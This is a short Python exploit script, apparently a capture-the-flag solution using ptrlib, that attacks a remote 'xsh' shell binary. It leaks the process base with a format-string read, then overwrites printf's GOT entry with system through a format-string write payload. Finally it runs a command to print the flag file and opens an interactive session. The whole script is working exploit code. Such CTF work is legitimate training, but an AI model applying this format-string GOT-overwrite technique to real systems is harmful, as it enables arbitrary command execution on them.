from ptrlib import *

elf = ELF("./xsh")
#sock = Process("./xsh")
sock = Socket("35.192.206.226", 5555)

# leak proc base
"""
sock.sendlineafter("$", "echo %175$p")
libc_base = int(sock.recvline(), 16)
logger.info("libc base = " + hex(libc_base))
"""
sock.sendlineafter("$", "echo %1$p")
proc_base = int(sock.recvline(), 16) - 0x23ae
logger.info("proc base = " + hex(proc_base))

# printf to system
writes = {
    proc_base + elf.got("printf"): proc_base + 0x1090
}
payload = fsb(
    written = 3,
    writes = writes,
    pos = 25,
    bs = 1,
    bits = 32
)
sock.sendlineafter("$", b"echo    " + payload)

sock.sendline("echo cat /home/vuln/flag.txt")

sock.interactive()
